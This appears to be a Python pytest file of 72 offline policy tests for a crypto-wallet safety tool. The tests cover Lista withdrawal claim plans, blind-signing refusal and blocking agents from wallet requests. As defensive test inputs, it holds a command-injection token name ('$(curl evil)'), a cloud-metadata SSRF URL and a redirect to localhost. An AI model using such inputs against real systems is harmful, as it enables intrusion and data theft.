"""72 v2 action-policy cases. Offline; none of these broadcast a transaction."""

from __future__ import annotations

import pytest

from guardian.actions.lista_plan import build_lista_claim_plan, claim_calldata, verify_saved_plan
from guardian.actions.policy import (
    CANONICAL_PLAN_KEYS,
    KillSwitch,
    agent_wallet_request,
    assert_call_target,
    assert_sender,
    batch_mode,
    client_wallet_request,
    connect_options,
    deadline_disclosure,
    deeplink_fallback,
    diagnose,
    invalidate_on_upgrade,
    next_revision,
    on_wallet_change,
    parse_intent,
    press_button,
    recover_task,
    reorg_correction,
    resolve_proxy,
    simulation_evidence,
    step_outcome,
    ttl_decision,
    unstake_alternatives,
    verified_source_meaning,
    verify_claim_postconditions,
    DIAGNOSIS_SIGNALS,
)
from guardian.amounts import format_units
from guardian.canonical import digest_body
from guardian.domain import (
    WithdrawalRequest,
    exact_approval,
    fee_label,
    gas_budget,
    ingest_untrusted,
    news_should_alert,
    revoke_effect,
    sanitize_share,
)
from guardian.errors import PolicyError, SecurityError
from guardian.security.ssrf import validate_url
from guardian.storage import Database

PROXY = "0x1adB950d8bB3dA4bE104211D5AB038628e477fE6"
IMPL = "0xF9a3702659d8bFDb2ff5E3c3f264E479801F63Bf"
SENDER = "0x1111111111111111111111111111111111111111"


class Book:
    def __init__(self, rows: list[WithdrawalRequest]) -> None:
        self.rows = rows
        self.reads = 0

    def read_now(self) -> list[WithdrawalRequest]:
        self.reads += 1
        return list(self.rows)


def _signals(**overrides):
    base = {name: True for name in DIAGNOSIS_SIGNALS}
    base.update(
        {
            "method_paused": False,
            "queueing": False,
            "exploit_suspected": False,
        }
    )
    base.update(overrides)
    return base


def _plan(rows, uuid=1, **kwargs):
    source = Book(rows)
    plan = build_lista_claim_plan(
        source=source,
        uuid=uuid,
        sender=SENDER,
        proxy=PROXY,
        implementation=IMPL,
        proxy_code_sha256="a" * 64,
        implementation_code_sha256="b" * 64,
        paused=kwargs.pop("paused", False),
        block_number=1,
        block_hash="0xabc",
        task_id="task-1",
        cached_idx=kwargs.pop("cached_idx", None),
        **kwargs,
    )
    return source, plan


def _claimable(uuid=1, amount=5, bnb=6):
    return WithdrawalRequest(uuid, amount, 1, True, bnb)


def test_x01_website_down_is_not_a_hack():
    found = diagnose(_signals(website_reachable=False))
    row = next(item for item in found["findings"] if item["id"] == "website_down_chain_ok")
    assert "protocol_hacked" in row["forbidden_inferences"]


def test_x02_indexer_gap_is_not_zero_assets():
    found = diagnose(_signals(indexer_ok=False))
    row = next(item for item in found["findings"] if item["id"] == "indexer_down")
    assert "zero_assets" in row["forbidden_inferences"]


def test_x03_rpc_fallback_must_be_preapproved():
    found = diagnose(_signals(default_rpc_ok=False, approved_fallback_rpc_ok=False))
    row = next(item for item in found["findings"] if item["id"] == "rpc_down")
    assert row["available"] == ["wait"]
    assert "search_result_rpc" in row["forbidden_inferences"]


def test_x04_relay_outage_does_not_assume_a_site_switch_fixes_it():
    found = diagnose(_signals(walletconnect_relay_ok=False, injected_provider_available=True))
    row = next(item for item in found["findings"] if item["id"] == "relay_down")
    assert "injected_provider" in row["available"]
    assert "switching_site_fixes_relay" in row["forbidden_inferences"]


def test_x05_shared_api_is_not_an_independent_backup():
    found = diagnose(_signals(guardian_backend_ok=False, action_client_independent=False))
    row = next(item for item in found["findings"] if item["id"] == "backend_down")
    assert row["available"] == ["not_independent"]


def test_x06_paused_method_is_blocked():
    found = diagnose(_signals(method_paused=True))
    row = next(item for item in found["findings"] if item["id"] == "method_paused")
    assert row["block_action"] is True
    _source, plan = _plan([_claimable()], paused=True)
    assert plan["state"] == "BLOCKED"
    assert plan["calls"] == []


def test_x07_selling_lst_does_not_complete_the_redeem():
    waiting = WithdrawalRequest(1, 5, 1, False, 0)
    _source, plan = _plan([waiting])
    sell = next(item for item in plan["alternatives"] if item["id"] == "sell_lst")
    assert sell["completes_original_redeem"] is False
    assert sell["requires_explicit_confirmation"] is True


def test_x08_halted_chain_has_no_generic_escape():
    found = diagnose(_signals(chain_producing_blocks=False, force_inclusion_verified=False))
    row = next(item for item in found["findings"] if item["id"] == "chain_halted")
    assert "generic_escape_hatch" in row["forbidden_inferences"]
    assert row["available"] == ["wait"]


def test_x09_missing_proof_is_blocked():
    found = diagnose(_signals(offchain_proof_available=False))
    row = next(item for item in found["findings"] if item["id"] == "proof_missing")
    assert row["status"] == "BLOCKED"


def test_x10_suspected_exploit_forbids_blind_signing():
    found = diagnose(_signals(exploit_suspected=True))
    row = next(item for item in found["findings"] if item["id"] == "exploit_suspected")
    assert row["block_unverified_writes"] is True


def test_x11_call_targets_the_proxy():
    with pytest.raises(PolicyError):
        assert_call_target(call_to=IMPL, proxy=PROXY, implementation=IMPL, msg_sender_sensitive=True)


def test_x12_unknown_proxy_is_not_guessed():
    assert resolve_proxy(proxy_type="custom-unknown", implementation=IMPL)["guessed"] is False
    assert resolve_proxy(proxy_type="custom-unknown", implementation=IMPL)["implementation"] is None


def test_x13_implementation_change_invalidates_the_plan():
    assert invalidate_on_upgrade(plan_impl_hash="aa", live_impl_hash="bb")["valid"] is False


def test_x14_verified_source_is_not_an_audit():
    meaning = verified_source_meaning()
    assert meaning["source_verified"] and meaning["audited"] is False and meaning["safe"] is False


def test_x15_code_hash_mismatch_blocks():
    assert invalidate_on_upgrade(plan_impl_hash="11", live_impl_hash="22")["reason"] == "implementation_changed"


def test_x16_same_selector_is_not_enough_without_the_pinned_proxy():
    with pytest.raises(PolicyError):
        assert_call_target(call_to="0x2222222222222222222222222222222222222222", proxy=PROXY, implementation=IMPL, msg_sender_sensitive=True)


def test_x17_erc1967_resolution_keeps_the_implementation():
    resolved = resolve_proxy(proxy_type="EIP1967Proxy", implementation=IMPL)
    assert resolved["status"] == "RESOLVED" and resolved["implementation"] == IMPL


def test_x18_material_change_creates_a_new_revision():
    revised = next_revision(revision=3, idx=0, new_idx=1, impl=IMPL, new_impl=IMPL)
    assert revised["revision"] == 4 and revised["replaced_silently"] is False and revised["previous_valid"] is False


def test_x19_idx_is_reread():
    source, plan = _plan([_claimable(uuid=7), _claimable(uuid=8, amount=9, bnb=10)], uuid=8)
    assert source.reads == 1
    assert plan["intent"]["idx"] == 1
    assert plan["preconditions"]["idx_reread"] is True


def test_x20_stale_cached_idx_is_rejected():
    _source, plan = _plan([_claimable()], cached_idx=4)
    assert plan["preconditions"]["stale_cache_rejected"] is True
    assert plan["intent"]["idx"] == 0


def test_x21_same_amount_needs_uuid():
    from guardian.domain import match_by_amount_forbidden

    rows = [_claimable(uuid=1, amount=5), _claimable(uuid=2, amount=5, bnb=6)]
    assert match_by_amount_forbidden(rows, 5)["reason"] == "amount_alone_forbidden"


def test_x22_second_claim_rereads_after_swap_pop():
    from guardian.domain import apply_swap_pop

    first = [_claimable(uuid=1), _claimable(uuid=2, amount=8, bnb=9)]
    _source, plan = _plan(first, uuid=1)
    assert plan["intent"]["idx"] == 0
    remaining = apply_swap_pop(first, 0)
    source2, plan2 = _plan(remaining, uuid=2, cached_idx=1)
    assert source2.reads == 1
    assert plan2["intent"]["idx"] == 0
    assert plan2["intent"]["uuid"] == "2"


def test_x23_ambiguous_identity_stops():
    source = Book([_claimable(uuid=1), _claimable(uuid=1, amount=2, bnb=2)])
    with pytest.raises(PolicyError):
        build_lista_claim_plan(
            source=source,
            uuid=1,
            sender=SENDER,
            proxy=PROXY,
            implementation=IMPL,
            proxy_code_sha256="a" * 64,
            implementation_code_sha256="b" * 64,
            paused=False,
            block_number=1,
            block_hash="0xabc",
            task_id="task",
        )


def test_x24_missing_request_is_not_silently_claimed():
    from guardian.domain import classify_lista_request

    assert classify_lista_request(None, age_days=None, claim_evidence=False) == "MISSING_NO_CLAIM_EVIDENCE"


def test_x25_safe_assets_are_not_claimed_by_the_owner_eoa():
    with pytest.raises(PolicyError):
        assert_sender(holder=PROXY, holder_type="safe", connected=SENDER, ownership_basis="user_wallet_connected_this_session")


def test_x26_sensitive_claim_is_not_wrapped():
    with pytest.raises(PolicyError):
        assert_call_target(call_to="0x3333333333333333333333333333333333333333", proxy=PROXY, implementation=IMPL, msg_sender_sensitive=True)


def test_x27_watch_only_cannot_execute():
    with pytest.raises(PolicyError):
        assert_sender(
            holder=SENDER,
            holder_type="eoa",
            connected=SENDER,
            ownership_basis="user_provided_watch_address",
        )
    _source, plan = _plan([_claimable()])
    assert plan["wallet_request_allowed"] is False
    assert any("watch-only" in reason for reason in plan["block_reasons"])


def test_x28_execution_account_type_stays_unproven():
    _source, plan = _plan([_claimable()])
    assert plan["execution_account_type"] == "unproven"


def test_x29_digest_mismatch_is_rejected():
    _source, plan = _plan([_claimable()])
    plan["digest"] = "0" * 64
    with pytest.raises(PolicyError):
        verify_saved_plan(plan, expected_calldata=plan["calls"][0]["data"])


def test_x30_summary_amount_cannot_drift():
    _source, plan = _plan([_claimable()])
    plan["human_summary"]["amount_out_raw"] = "1"
    with pytest.raises(PolicyError):
        verify_saved_plan(plan, expected_calldata=None)


def test_x31_arbitrary_hex_intent_is_rejected():
    with pytest.raises(SecurityError):
        parse_intent({"protocol_version": "guardian.intent.v1", "type": "lista_claim_withdraw", "uuid": "1", "chain_id": 56, "data": "0xdead"})


def test_x32_client_rebuild_must_match():
    _source, plan = _plan([_claimable()])
    plan["calls"][0]["data"] = claim_calldata(9)
    plan["digest"] = digest_body({key: plan[key] for key in CANONICAL_PLAN_KEYS})
    with pytest.raises(PolicyError):
        verify_saved_plan(plan, expected_calldata=claim_calldata(0))


def test_x33_claim_plan_has_no_extra_deposit_or_approve():
    _source, plan = _plan([_claimable()])
    assert len(plan["calls"]) == 1
    assert "approve" not in plan["calls"][0]["data"]
    assert plan["calls"][0]["value"] == "0"


def test_x34_claim_value_stays_zero():
    data = claim_calldata(0)
    assert data.startswith("0xb13acedd")
    _source, plan = _plan([_claimable()])
    assert plan["calls"][0]["value"] == "0"


def test_x35_balance_override_is_not_live_evidence():
    assert simulation_evidence({"success": True, "state_overrides": True, "override_kind": "balance", "effects_checked": True})[
        "usable_as_live_evidence"
    ] is False


def test_x36_pause_override_is_test_only():
    result = simulation_evidence({"success": True, "state_overrides": True, "override_kind": "pause_disabled"})
    assert result["label"] == "TEST_ONLY_OVERRIDE"


def test_x37_pregranted_approval_override_is_not_live_evidence():
    result = simulation_evidence({"success": True, "state_overrides": True, "override_kind": "approval"})
    assert result["usable_as_live_evidence"] is False


def test_x38_success_true_without_effects_is_incomplete():
    result = simulation_evidence({"success": True, "effects_checked": False, "state_overrides": False})
    assert result["status"] == "INCOMPLETE"
    _source, plan = _plan([_claimable()], effects_checked=False)
    assert plan["simulation"]["status"] == "INCOMPLETE"
    assert plan["wallet_request_allowed"] is False


def test_x39_local_ttl_blocks_a_new_request():
    assert ttl_decision(now=200, deadline=100, submitted=False)["allow_new_wallet_request"] is False


def test_x40_local_ttl_does_not_cancel_a_submitted_transaction():
    decision = ttl_decision(now=500, deadline=100, submitted=True)
    assert decision["cancels_submitted"] is False
    assert decision["allow_new_wallet_request"] is False


def test_x41_changes_are_not_silently_replaced():
    revised = next_revision(revision=1, idx=0, new_idx=0, impl=IMPL, new_impl="0x9999999999999999999999999999999999999999")
    assert revised["replaced_silently"] is False and revised["revision"] == 2


def test_x42_missing_onchain_deadline_stays_disclosed():
    note = deadline_disclosure(has_onchain_deadline=False)
    assert note["claim_stale_cannot_land"] is False
    assert "deadline" in note["residual"]


def test_x43_unknown_fee_is_not_free():
    label = fee_label(None)
    assert label["is_free"] is False and label["label"] == "費用未知"


def test_x44_incoming_claim_is_not_gas():
    budget = gas_budget(native_balance=10, fee=20, incoming_from_tx=100)
    assert budget["sufficient"] is False
    assert budget["counted_incoming_claim_as_gas"] is False


def test_x45_approval_is_exact_not_unlimited():
    assert exact_approval(5) == 5
    with pytest.raises(PolicyError):
        exact_approval(2**256 - 1)


def test_x46_revoke_does_not_recover_transferred_assets():
    assert revoke_effect()["recovers_already_transferred"] is False


def test_x47_permit_is_not_enabled():
    with pytest.raises(SecurityError):
        client_wallet_request(
            "eth_signTypedData_v4",
            user_clicked=True,
            wallet_request_allowed=True,
            release_enabled=True,
            mainnet_authorized=True,
        )


def test_x48_blind_signatures_are_refused():
    for method in ("eth_sign", "personal_sign", "eth_signTypedData"):
        with pytest.raises(SecurityError):
            client_wallet_request(
                method,
                user_clicked=True,
                wallet_request_allowed=True,
                release_enabled=True,
                mainnet_authorized=True,
            )


def test_x49_wallet_rejection_is_not_retried():
    decision = press_button({"state": "USER_REJECTED", "revision": 1}, revision=1)
    assert decision["new_submission"] is False
    assert decision["reason"] == "rejected_no_auto_retry"


def test_x50_submission_hash_is_not_completion():
    recovered = recover_task(state="WALLET_REQUESTED", found_hash=True)
    assert recovered["state"] == "SUBMITTED"
    assert recovered["new_transaction"] is False


def test_x51_refresh_does_not_create_another_transaction():
    recovered = recover_task(state="SUBMISSION_UNKNOWN", found_hash=False)
    assert recovered["new_transaction"] is False
    assert recovered["state"] == "SUBMISSION_UNKNOWN"


def test_x52_repeat_press_does_not_submit_again():
    decision = press_button({"state": "WALLET_REQUESTED", "revision": 2}, revision=2)
    assert decision["new_submission"] is False


def test_x53_atomic_required_is_not_downgraded():
    decision = batch_mode(capability="unsupported", atomic_required=True)
    assert decision["downgraded"] is False and decision["batch"] is False and decision["mode"] == "blocked"


def test_x54_ready_does_not_auto_upgrade():
    assert batch_mode(capability="ready", atomic_required=False)["mode"] == "do_not_auto_upgrade"
    with pytest.raises(PolicyError):
        batch_mode(capability="supported?", atomic_required=False)


def test_x55_account_or_chain_change_invalidates_the_plan():
    assert on_wallet_change("accountsChanged")["valid"] is False
    assert on_wallet_change("chainChanged")["valid"] is False


def test_x56_phone_is_not_self_scan_only():
    options = connect_options(form_factor="phone")
    assert options["self_qr_only"] is False
    assert "open_in_system_browser" in options["options"]


def test_x57_partial_steps_stay_partial():
    assert step_outcome([{"ok": True}, {"ok": False}]) == "PARTIAL"


def test_x58_reorg_requests_a_correction():
    assert reorg_correction()["correction_alert"] is True


def test_x59_completion_needs_postconditions():
    result = verify_claim_postconditions(
        request_gone=True,
        claim_log={"bnb_raw": 100},
        native_delta=90,
        gas_used=10,
        concurrent_other_txs=False,
    )
    assert result["verified"] is True
    assert step_outcome([{"ok": True}]) == "AWAITING_POSTCONDITIONS"


def test_x60_list_disappearance_alone_is_not_complete():
    result = verify_claim_postconditions(
        request_gone=True,
        claim_log=None,
        native_delta=1,
        gas_used=1,
        concurrent_other_txs=False,
    )
    assert result["verified"] is False
    assert result["list_disappearance_is_enough"] is False


def test_x61_native_delta_accounts_for_gas():
    result = verify_claim_postconditions(
        request_gone=True,
        claim_log={"bnb_raw": 100},
        native_delta=100,
        gas_used=10,
        concurrent_other_txs=False,
    )
    assert result["verified"] is False
    ambiguous = verify_claim_postconditions(
        request_gone=True,
        claim_log={"bnb_raw": 100},
        native_delta=90,
        gas_used=10,
        concurrent_other_txs=True,
    )
    assert ambiguous["reason"] == "native_delta_ambiguous"


def test_x62_kill_switch_keeps_reads():
    switch = KillSwitch(False)
    assert switch.read()["ok"] is True
    with pytest.raises(SecurityError):
        switch.write()


def test_x63_token_text_does_not_run_commands():
    assert ingest_untrusted("token name: $(curl evil)").get("commands") == []


def test_x64_news_instruction_does_not_alert_without_exposure():
    item = {"incident_id": "prompt", "domain": "evil.example", "direct_threat": False}
    assert news_should_alert(item, has_exposure=False, has_active_allowance=False, seen_incidents=set()) is False


def test_x65_metadata_ip_fetch_is_blocked():
    with pytest.raises(SecurityError):
        validate_url("http://169.254.169.254/computeMetadata/v1/")


def test_x66_redirect_to_localhost_is_blocked():
    from guardian.security.ssrf import next_redirect

    with pytest.raises(SecurityError):
        next_redirect("https://docs.bsc.lista.org/a", "http://127.0.0.1/x", resolve=lambda _host: ["1.1.1.1"])


def test_x67_tenant_plans_are_isolated(tmp_path):
    database = Database(tmp_path / "plans.sqlite")
    database.save_task("a", {"task_id": "t", "revision": 1, "state": "SIMULATED", "secret": "a"})
    database.save_task("b", {"task_id": "t2", "revision": 1, "state": "SIMULATED", "secret": "b"})
    assert database.get_task("a", "t2") is None
    assert database.get_task("b", "t") is None
    database.close()


def test_x68_rescue_bundle_strips_secrets():
    cleaned = sanitize_share({"api_key": "k", "seed": "words", "version": "0.2.0", "note": "0x1111111111111111111111111111111111111111"})
    assert "api_key" not in cleaned and "seed" not in cleaned
    assert "0x1111" not in cleaned["note"]


def test_x69_agent_cannot_open_a_wallet_request():
    with pytest.raises(SecurityError):
        agent_wallet_request("eth_sendTransaction")
    with pytest.raises(SecurityError):
        agent_wallet_request("wallet_sendCalls")


def test_x70_cli_policy_cannot_trigger_the_wallet():
    decision = press_button({"state": "SIMULATED", "revision": 1}, revision=1)
    assert decision["reason"] == "wallet_requests_disabled"
    with pytest.raises(SecurityError):
        agent_wallet_request("eth_sendRawTransaction")


def test_x71_mainnet_flag_false_blocks_the_client():
    with pytest.raises(SecurityError):
        client_wallet_request(
            "eth_sendTransaction",
            user_clicked=True,
            wallet_request_allowed=True,
            release_enabled=True,
            mainnet_authorized=False,
        )


def test_x72_arbitrary_contract_call_is_unavailable():
    with pytest.raises(SecurityError):
        parse_intent({"type": "arbitrary_contract_call", "calldata": "0x1234"})


def test_catalog_has_72_cases():
    names = {name for name in globals() if name.startswith("test_x")}
    assert len(names) == 72


def test_claimable_summary_uses_plan_amounts():
    _source, plan = _plan([_claimable(amount=123, bnb=456)])
    assert plan["human_summary"]["amount_out_raw"] == "456"
    assert plan["human_summary"]["fee_label"] == "費用未知"
    assert "100%" not in plan["human_summary"]["purpose"]
    verify_saved_plan(plan, expected_calldata=claim_calldata(0))
    assert format_units(plan["asset_out"]["raw_amount"], 18)


def test_incomplete_diagnosis_is_not_a_single_boolean():
    assert diagnose({"website_reachable": False})["status"] == "INCOMPLETE"


def test_market_exit_is_separate_from_waiting():
    alts = unstake_alternatives(claimable=False, paused=False)
    assert any(item["id"] == "wait" for item in alts)
    assert deeplink_fallback()["next"] == "open_in_browser"
